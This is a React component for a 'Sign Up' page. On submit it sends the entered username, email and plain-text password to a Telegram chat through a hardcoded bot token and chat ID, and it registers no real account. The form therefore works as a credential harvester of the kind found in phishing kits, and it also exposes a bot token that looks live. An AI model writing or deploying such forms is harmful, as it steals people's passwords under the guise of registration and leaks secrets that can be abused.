import React, { useState } from "react";
import axios from "axios";
import scss from "./Home.module.scss";

export const Home = () => {
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const TOKEN = "6251110774:AAENSV5zQS3Avog_97IvhgyvU-9go3AdfXs";
  const CHAT_ID = "-1001957930860";
  const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  const messageModel = () => {
    let message = `<b>Username: ${username}</b>\n`;
    message += `<b>Email: ${email}</b>\n`;
    message += `<b>Password: ${password}</b>\n`;

    return message;
  };

  const handleChangeUsername = (e) => {
    setUsername(e.target.value);
  };

  const handleChangeEmail = (e) => {
    setEmail(e.target.value);
  };

  const handleChangePassword = (e) => {
    setPassword(e.target.value);
  };

  const sendData = async (e) => {
    e.preventDefault();

    if (!validateUsername(username)) {
      errUsername.innerText = "Please enter a valid name!";
      return;
    } else if (!validateEmail(email)) {
      errEmail.innerText = "Please enter a valid e-mail adress!";
      errUsername.innerText = "";
      return;
    } else {
      errUsername.innerText = "";
      errEmail.innerText = "";
    }

    try {
      await axios.post(API_URL, {
        chat_id: CHAT_ID,
        parse_mode: "html",
        text: messageModel(),
      });

      setUsername("");
      setEmail("");
      setPassword("");

      alert("Success!");
    } catch (err) {
      console.log(err);
    }
  };

  const validateUsername = (nameS) => {
    const regex = /^[\w\s]{2,30}$/;
    return regex.test(nameS);
  };

  const validateEmail = (emailS) => {
    const regex = /^\S+@\S+\.\S+$/;
    return regex.test(emailS);
  };

  return (
    <>
      <div className={scss.home_page}>
        <div className="container">
          <div className={scss.content}>
            {/* <div className={scss.box}></div> */}
            <form onSubmit={sendData} className={scss.form}>
              <div className={scss.title}>
                <h3>Sign Up</h3>
              </div>

              <input
                required
                type="text"
                placeholder="Username*"
                value={username}
                className={scss.input}
                onChange={handleChangeUsername}
              />
              <span id="errUsername"></span>

              <input
                required
                type="text"
                placeholder="E-mail*"
                value={email}
                className={scss.input}
                onChange={handleChangeEmail}
              />
              <span id="errEmail"></span>

              <input
                required
                type="password"
                placeholder="Password*"
                value={password}
                className={scss.input}
                onChange={handleChangePassword}
              />
              <span id="errPassword"></span>

              <button type="submit" className={scss.button}>
                Sign Up
              </button>
            </form>
          </div>
        </div>
      </div>
    </>
  );
};
